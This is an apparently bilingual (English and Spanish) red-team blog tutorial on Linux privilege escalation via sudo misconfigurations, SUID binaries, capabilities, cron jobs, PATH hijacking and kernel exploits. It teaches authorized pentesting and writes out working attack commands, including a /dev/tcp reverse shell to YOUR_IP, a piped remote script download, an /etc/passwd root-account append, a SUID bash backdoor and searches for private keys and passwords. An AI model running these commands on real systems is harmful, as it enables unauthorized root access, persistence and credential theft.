Privilege Escalation on Linux — SUID, cron jobs and capabilities

Situation: You have a low-privilege shell on a Linux machine. And you wonder, now what? This post covers the systematic methodology of privilege escalation: from initial enumeration to the most exploited vectors — SUID, sudo, cron jobs, capabilities and kernel exploits.

Situación: Tienes una shell de bajo privilegio en una máquina Linux. Y te preguntas ¿y ahora qué? Este post cubre la metodología sistemática de escalada de privilegios: desde la enumeración inicial hasta los vectores más explotados — SUID, sudo, cron jobs, capabilities y kernel exploits.

Red Team · Update of the post from 2024-08-05
📝 NOTE: All techniques in this post assume you have explicit authorization over the target system. They apply to legitimate pentesting environments, CTFs and your own labs for educational purposes. REMEMBER that privilege escalation on systems you don't own without permission is illegal.

The privilege escalation mindset

Getting the initial foothold rarely gives you full control. You usually land as an unprivileged user — www-data, a service account, or a low-level user. The goal of escalation is to move from that limited access to root, total control of the system.

Linux privilege escalation falls into two broad categories:

  • Vertical escalation: moving from an unprivileged user to root (or to a more privileged user).
  • Horizontal escalation: moving laterally to another user at the same level, often as an intermediate step.

The golden rule: enumeration is everything. 90% of the work is finding the vector; exploiting it is usually the easy part. A methodical attacker who enumerates well always beats one who throws exploits at random.

Phase 1: Initial enumeration

Before hunting for specific vectors, you need to understand where you are. These are the basic orientation commands:

# Who am I and what groups do I belong to?
id
whoami

# System info and kernel version
uname -a
cat /etc/os-release

# What users exist on the system?
cat /etc/passwd | cut -d: -f1

# Which users have a valid shell? (potential targets)
grep "sh$" /etc/passwd

# Environment variables (sometimes contain credentials)
env

# What's in my current directory and in /home?
ls -la
ls -la /home/*
💡 TIP: The first thing you should always check is sudo -l. If your user can run something as root without a password, you might have escalation handed to you on a plate before you even start enumerating.

Network and process checks

# Running processes (look for services as root)
ps aux | grep root

# Listening ports (internal services not exposed)
netstat -tulpn 2>/dev/null
ss -tulpn

# Active connections
netstat -antp 2>/dev/null

Phase 2: Automated enumeration

Doing everything by hand is slow, but it helps you learn. That said, these tools automate the search for vectors and highlight what's interesting:

# LinPEAS — the gold standard, very thorough
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# If there's no internet egress, upload the script and run it
wget http://YOUR_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# LinEnum — a lighter alternative
./LinEnum.sh -t

# pspy — monitor processes without root privileges
# (excellent for spotting running cron jobs)
./pspy64
⚠️ WARNING: LinPEAS is very noisy and leaves traces in logs. In a real engagement with an active Blue Team, consider selective manual enumeration instead of launching scripts that trip every alarm (that's if you want a blackbox approach; if you have the organization's permission, LinPEAS is far more practical — time is gold).

Phase 3: Escalation vectors

3.1 — Misconfigured sudo

The first place to look. sudo -l shows which commands your user can run as root:

sudo -l

A typical output would look like this:

Matching Defaults entries for www-data on victim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin

User www-data may run the following commands on victim:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/vim
    (ALL) /bin/bash

How to read this:

  • (root) NOPASSWD: /usr/bin/find → you can run find as root without a password. Direct escalation vector via GTFOBins.
  • (root) NOPASSWD: /usr/bin/vim → same with vim, another classic binary to spawn a root shell.
  • (ALL) /bin/bash → you can run bash as any user (including root), though here it would ask for a password since it lacks NOPASSWD.

If the output shows binaries you can run as root, check GTFOBins to see how to abuse them. Classic examples:

# If you can run 'find' as root
sudo find . -exec /bin/sh \; -quit

# If you can run 'vim' as root
sudo vim -c ':!/bin/sh'

# If you can run 'less' as root
sudo less /etc/profile
# Inside less: !/bin/sh

# If you can run 'python' as root
sudo python3 -c 'import os; os.system("/bin/sh")'

# If you have sudo over EVERYTHING (ALL)
sudo su -
💡 TIP: GTFOBins is your best friend. For ANY binary that shows up in sudo -l or with SUID, look it up on gtfobins.github.io — it will tell you exactly how to turn it into a root shell.

3.2 — SUID binaries

The SUID (Set User ID) bit makes a binary run with the permissions of its owner, not the user launching it. If a root-owned binary has SUID and is exploitable, you get execution as root:

# Find all binaries with the SUID bit
find / -perm -4000 -type f 2>/dev/null

# More detailed version with permissions
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;

Compare the resulting list against GTFOBins. Some exploitation examples:

# find with SUID
find . -exec /bin/sh -p \; -quit

# bash with SUID (-p preserves privileges)
/bin/bash -p

# nmap (old versions in interactive mode)
nmap --interactive
# then: !sh

# cp with SUID — overwrite /etc/passwd
# Generate hash: openssl passwd -1 -salt abc password
echo 'root2:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
⚠️ WARNING: Modifying /etc/passwd or /etc/shadow is destructive and highly detectable. In a real engagement, prioritize methods that don't alter critical system files.

3.3 — Capabilities

Capabilities are "granular" permissions that give a binary specific root powers without full SUID. A misassigned capability is as dangerous as a SUID:

# List binaries with capabilities
getcap -r / 2>/dev/null

# Dangerous capability: cap_setuid
# If python has cap_setuid+ep:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# If perl has cap_setuid+ep:
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

The cap_setuid capability is the most critical — it lets a process change its UID to 0 (root). Other dangerous ones: cap_dac_read_search (read any file), cap_sys_admin (almost root).

3.4 — Cron jobs

Scheduled tasks (cron) running as root that are writable by your user are a classic vector:

# View system cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# User cron jobs
crontab -l

# Monitor processes in real time to CATCH crons
# (pspy is ideal because it doesn't need root)
./pspy64

If you find a script run by cron as root and you can write to it, you could inject your payload:

# If the script is writable, append a reverse shell
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /path/script.sh

# Or create a SUID bash for persistent escalation
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/script.sh
# Wait for the cron to run, then:
/tmp/rootbash -p
💡 TIP: Sometimes the problem isn't the script itself, but that the cron uses a relative path or a manipulable PATH. If the cron calls a binary without an absolute path, you might be able to place a malicious binary with that name in a PATH directory.

3.5 — PATH hijacking

If a script or SUID binary calls another command without specifying its absolute path, you can hijack the PATH so it runs your version:

# Imagine a SUID binary that runs 'service' without a full path
# Create your own malicious 'service':
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# Prepend /tmp to the PATH
export PATH=/tmp:$PATH

# Run the vulnerable SUID binary — it will use YOUR 'service'
/path/suid_binary

3.6 — Files with credentials

Credentials leaked in files are surprisingly common (you'd be shocked when doing forensics and seeing this with people who are supposed to be the first to comply with security policies):

# Search for passwords in config files
grep -ri "password" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# History files (sometimes contain commands with passwords)
cat ~/.bash_history
cat ~/.mysql_history

# Private SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Backup and config files
find / -name "*.bak" 2>/dev/null
find / -name "config.php" 2>/dev/null

3.7 — Kernel exploits

As a last resort (they're unstable and can crash the system almost for sure), an outdated kernel may have public exploits:

# Identify the exact kernel version
uname -r

# Search for known exploits
searchsploit linux kernel 5.4

# Tool that suggests exploits based on the kernel
./linux-exploit-suggester.sh
⚠️ WARNING: Kernel exploits can cause kernel panics and crash the machine. Use them only when all other vectors fail, and never in production without warning the client. In a real engagement they can cost you trust if you take down a critical server and disrupt a client's operations.

Phase 4: Stabilize and persist

Once you have root, stabilize the access:

# Confirm you are root
id
# uid=0(root) gid=0(root)

# If you arrived via a SUID binary, spawn a full shell
/tmp/rootbash -p

# Upgrade a limited shell to a full TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

In an engagement, you must document how you reached root with screenshots and the exact commands — sometimes the client even requests a dump of the history. The report is as important as the access.

Summary checklist

When you're in front of a Linux machine, go through this list in order (everyone can build their own list, this is an example):

  • id and sudo -l — quick privilege check
  • uname -a — kernel version
  • find / -perm -4000 2>/dev/null — SUID binaries
  • getcap -r / 2>/dev/null — capabilities
  • cat /etc/crontab + pspy — scheduled tasks
  • Search for credentials in config, history and backups
  • SSH keys and sensitive files
  • LinPEAS for a full automated pass
  • Kernel exploits as a last resort

La mentalidad de la escalada de privilegios

Conseguir el primer acceso (foothold) rara vez te da control total. Normalmente aterrizas como un usuario sin privilegios — www-data, un usuario de servicio, o una cuenta de bajo nivel. El objetivo de la escalada es pasar de ese acceso limitado a root, el control absoluto del sistema.

La escalada de privilegios en Linux se divide en dos grandes categorías:

  • Escalada vertical: pasar de un usuario sin privilegios a root (o a un usuario con más permisos).
  • Escalada horizontal: moverte lateralmente a otro usuario del mismo nivel, a menudo como paso intermedio.

La regla de oro: la enumeración lo es todo. El 90% del trabajo es encontrar el vector; explotarlo suele ser la parte fácil. Un atacante metódico que enumera bien siempre supera a uno que va lanzando exploits al azar.

Fase 1: Enumeración inicial

Antes de buscar vectores específicos, necesitas entender dónde estás. Estos son los comandos de orientación básica:

# ¿Quién soy y a qué grupos pertenezco?
id
whoami

# Información del sistema y versión del kernel
uname -a
cat /etc/os-release

# ¿Qué usuarios existen en el sistema?
cat /etc/passwd | cut -d: -f1

# ¿Qué usuarios tienen shell válida? (objetivos potenciales)
grep "sh$" /etc/passwd

# Variables de entorno (a veces contienen credenciales)
env

# ¿Qué hay en mi directorio actual y en /home?
ls -la
ls -la /home/*
💡 TIP: Lo primero que debes mirar siempre es sudo -l. Si tu usuario puede ejecutar algo como root sin contraseña, puede que tengas la escalada servida en bandeja antes incluso de empezar a enumerar.

Comprobaciones de red y procesos

# Procesos corriendo (busca servicios como root)
ps aux | grep root

# Puertos en escucha (servicios internos no expuestos)
netstat -tulpn 2>/dev/null
ss -tulpn

# Conexiones activas
netstat -antp 2>/dev/null

Fase 2: Enumeración automatizada

Hacer todo a mano es lento, pero sirve para aprender. Sin embargo, estas herramientas automatizan la búsqueda de vectores y resaltan lo interesante:

# LinPEAS — el estándar de oro, muy completo
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Si no hay salida a internet, sube el script y ejecútalo
wget http://TU_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# LinEnum — alternativa más light
./LinEnum.sh -t

# pspy — monitoriza procesos sin privilegios de root
# (excelente para detectar cron jobs en ejecución)
./pspy64
⚠️ ADVERTENCIA: LinPEAS hace mucho ruido y deja rastro en logs. En un engagement real con Blue Team activo, hay que considerar una enumeración manual selectiva en lugar de lanzar scripts que disparan todas las alarmas (eso si se quiere hacer como blackbox, si se tiene permiso de la organización es mucho más factible el LinPEAS — el tiempo es oro).

Fase 3: Vectores de escalada

3.1 — sudo mal configurado

El primer sitio donde mirar. sudo -l muestra qué comandos puede ejecutar tu usuario como root:

sudo -l

Una salida típica se vería así:

Matching Defaults entries for www-data on victim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin

User www-data may run the following commands on victim:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/vim
    (ALL) /bin/bash

Cómo leer esto:

  • (root) NOPASSWD: /usr/bin/find → puedes ejecutar find como root sin contraseña. Vector directo de escalada vía GTFOBins.
  • (root) NOPASSWD: /usr/bin/vim → lo mismo con vim, otro binario clásico para abrir una shell de root.
  • (ALL) /bin/bash → puedes ejecutar bash como cualquier usuario (incluido root), aunque aquí sí pediría contraseña al no llevar NOPASSWD.

Si el resultado muestra binarios que puedes ejecutar como root, consulta GTFOBins para ver cómo abusar de ellos. Ejemplos clásicos:

# Si puedes ejecutar 'find' como root
sudo find . -exec /bin/sh \; -quit

# Si puedes ejecutar 'vim' como root
sudo vim -c ':!/bin/sh'

# Si puedes ejecutar 'less' como root
sudo less /etc/profile
# Dentro de less: !/bin/sh

# Si puedes ejecutar 'python' como root
sudo python3 -c 'import os; os.system("/bin/sh")'

# Si tienes sudo sobre TODO (ALL)
sudo su -
💡 TIP: GTFOBins es tu mejor amigo. Para CUALQUIER binario que aparezca en sudo -l o con SUID, búscalo en gtfobins.github.io — te dirá exactamente cómo convertirlo en una shell de root.

3.2 — Binarios SUID

El bit SUID (Set User ID) hace que un binario se ejecute con los permisos de su propietario, no del usuario que lo lanza. Si un binario propiedad de root tiene SUID y es explotable, obtienes ejecución como root:

# Buscar todos los binarios con bit SUID
find / -perm -4000 -type f 2>/dev/null

# Versión más detallada con permisos
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;

Compara la lista resultante con GTFOBins. Algunos ejemplos de explotación:

# find con SUID
find . -exec /bin/sh -p \; -quit

# bash con SUID (la -p preserva privilegios)
/bin/bash -p

# nmap (versiones antiguas en modo interactivo)
nmap --interactive
# luego: !sh

# cp con SUID — sobrescribir /etc/passwd
# Generar hash: openssl passwd -1 -salt abc password
echo 'root2:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
⚠️ ADVERTENCIA: Modificar /etc/passwd o /etc/shadow es destructivo y muy detectable. En un engagement real hay que priorizar métodos que no alteren archivos críticos del sistema.

3.3 — Capabilities

Las capabilities son permisos "granulares" que dan a un binario poderes específicos de root sin el SUID completo. Una capability mal asignada es tan peligrosa como un SUID:

# Listar binarios con capabilities
getcap -r / 2>/dev/null

# Capability peligrosa: cap_setuid
# Si python tiene cap_setuid+ep:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Si perl tiene cap_setuid+ep:
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

La capability cap_setuid es la más crítica — permite a un proceso cambiar su UID a 0 (root). Otras peligrosas: cap_dac_read_search (leer cualquier archivo), cap_sys_admin (casi root).

3.4 — Cron jobs

Las tareas programadas (cron) que corren como root y son escribibles por tu usuario son un vector clásico:

# Ver cron jobs del sistema
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# Cron jobs de usuarios
crontab -l

# Monitorizar procesos en tiempo real para CAPTURAR crons
# (pspy es ideal porque no necesita root)
./pspy64

Si encuentras un script ejecutado por cron como root y puedes escribir en él, podrías inyectar tu payload:

# Si el script es escribible, añade una reverse shell
echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' >> /ruta/script.sh

# O crea un SUID bash para escalada persistente
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /ruta/script.sh
# Espera a que el cron ejecute, luego:
/tmp/rootbash -p
💡 TIP: A veces el problema no es el script en sí, sino que el cron usa una ruta relativa o un PATH manipulable. Si el cron llama a un binario sin ruta absoluta, puede que puedas colocar un binario malicioso con ese nombre en un directorio del PATH.

3.5 — PATH hijacking

Si un script o binario SUID llama a otro comando sin especificar su ruta absoluta, puedes secuestrar el PATH para que ejecute tu versión:

# Imagina un binario SUID que ejecuta 'service' sin ruta completa
# Creas tu propio 'service' malicioso:
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# Antepones /tmp al PATH
export PATH=/tmp:$PATH

# Ejecutas el binario SUID vulnerable — usará TU 'service'
/ruta/binario_suid

3.6 — Archivos con credenciales

Las credenciales filtradas en archivos son sorprendentemente comunes (te asustarías cuando se realiza un forense y vemos esto con gente que se supone que debería de ser la primera en cumplir con las políticas de seguridad):

# Buscar contraseñas en archivos de configuración
grep -ri "password" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Archivos de historial (a veces contienen comandos con contraseñas)
cat ~/.bash_history
cat ~/.mysql_history

# Claves SSH privadas
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Archivos de backup y configuración
find / -name "*.bak" 2>/dev/null
find / -name "config.php" 2>/dev/null

3.7 — Kernel exploits

Como último recurso (son inestables y pueden hacer tumbar el sistema casi for sure), un kernel desactualizado puede tener exploits públicos:

# Identificar versión exacta del kernel
uname -r

# Buscar exploits conocidos
searchsploit linux kernel 5.4

# Herramienta que sugiere exploits según el kernel
./linux-exploit-suggester.sh
⚠️ ADVERTENCIA: Los kernel exploits pueden causar kernel panics y tumbar la máquina. Úsalos solo cuando todos los demás vectores fallen, y nunca en producción sin avisar al cliente. En un engagement real pueden costarte la confianza si tiras un servidor crítico y tumbas la operatividad de un cliente.

Fase 4: Estabilizar y persistir

Una vez que tienes root, estabiliza el acceso:

# Confirmar que eres root
id
# uid=0(root) gid=0(root)

# Si llegaste con un binario SUID, lanza una shell completa
/tmp/rootbash -p

# Mejorar una shell limitada a TTY completa
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

En un engagement, se debe documentar cómo llegaste a root con capturas y los comandos exactos, a veces incluso se solicita por parte del cliente un volcado del history. El informe es tan importante como el acceso.

Checklist resumen

Cuando estemos delante de una máquina Linux, repasa esta lista en orden (cada uno puede hacerse su lista propia, esta es de ejemplo):

  • id y sudo -l — comprobación rápida de privilegios
  • uname -a — versión del kernel
  • find / -perm -4000 2>/dev/null — binarios SUID
  • getcap -r / 2>/dev/null — capabilities
  • cat /etc/crontab + pspy — tareas programadas
  • Buscar credenciales en config, historial y backups
  • Claves SSH y archivos sensibles
  • LinPEAS para una pasada automatizada completa
  • Kernel exploits como último recurso
